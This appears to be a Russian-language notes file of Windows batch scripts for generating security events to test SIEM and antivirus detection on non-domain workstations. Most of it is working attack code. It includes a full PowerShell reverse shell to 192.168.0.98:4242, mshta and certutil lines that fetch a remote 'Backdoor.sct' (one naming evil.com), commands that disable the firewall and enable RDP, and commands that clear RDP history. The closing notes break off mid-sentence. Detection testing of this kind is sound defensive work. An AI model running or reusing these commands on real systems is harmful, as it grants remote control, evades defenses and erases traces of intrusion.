Скрипт для генерации событий о разных видах enumaration АРМов не в домене.
```bat
@echo off
# Enumarate user prive/group
whoami
whoami /priv
whoami /groups
# Enumarate users, groups
net user 
net localgroup 
# Enumarate firewall, AV solutions
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
# Enumarate network
ipconfig
# Disable/enable firewall
netsh advfirewall set allprofiles state off
netsh advfirewall set allprofiles state on
# Turn on remote connection
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# Clear last rdp connection from registry
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
# Fast create and delete local user
net user test 12345 /add
net user test /delete
# Simulate delete home user directory 
mkdir C:\Users\test
rd /s /q "C:\Users\test"
```

Скрипт для генерации событий о реакции на малварь AV.
```bat
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.0.98",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
mshta https://gist.githubusercontent.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba/raw/6cb52b88bcc929f5555cd302d9ed848b7e407052/Backdoor.sct
certutil.exe -urlcache -f https://gist.githubusercontent.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba/raw/6cb52b88bcc929f5555cd302d9ed848b7e407052/Backdoor.sct evil.com
```
Отключение AV. После отключения AV SIEM должна сгенерировать инцидент оботключении AV. Повторный запуск тестовой малвари для генерации событий о небезопасных утилитах из cmd. 
```bat
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.0.98",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
mshta https://gist.githubusercontent.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba/raw/6cb52b88bcc929f5555cd302d9ed848b7e407052/Backdoor.sct
certutil.exe -urlcache -f https://gist.githubusercontent.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba/raw/6cb52b88bcc929f5555cd302d9ed848b7e407052/Backdoor.sct evil.com
# Можно запустить WinPEAS для генерации события о выгрузке в консоль чувствительной информации о системе.
```

P.S.
Для тестирования учётки AD на АРМ должен быть установлен RSAT или импортировать dll с частью 

P.S.S
С атакующего компа 
